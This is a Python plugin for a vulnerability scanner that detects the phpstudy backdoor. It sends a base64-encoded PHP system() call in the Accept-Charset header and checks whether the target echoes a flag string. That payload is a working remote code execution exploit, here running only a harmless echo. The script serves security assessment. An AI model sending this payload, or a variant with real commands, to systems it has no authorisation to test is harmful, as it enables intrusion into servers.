#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Copyright (c) saucerman (https://saucer-man.com)
See the file 'LICENSE' for copying permission
"""

"""
phpstudy后门检测脚本 
漏洞分析：
https://www.freebuf.com/articles/others-articles/215406.html
https://mp.weixin.qq.com/s/t-P-n98ZydP3aSCdC0C9hQ
"""


from lib.core.Request import request
from plugin.target_parse import get_standard_url


def poc(url):
    head={
    'Accept-Encoding':'gzip,deflate',
    'Accept-Charset':'c3lzdGVtKCdlY2hvIHBocHN0dWR5X2JhY2tkb29yX2ZsYWcnKTs='
    }
    target = get_standard_url(url)
    try:
        res = request.get(url=target, headers=head, timeout=5, allow_redirects=False)
        if res.status_code == 200 and res.text.startswith("phpstudy_backdoor_flag"):
                return url
    except:
        pass
    return False
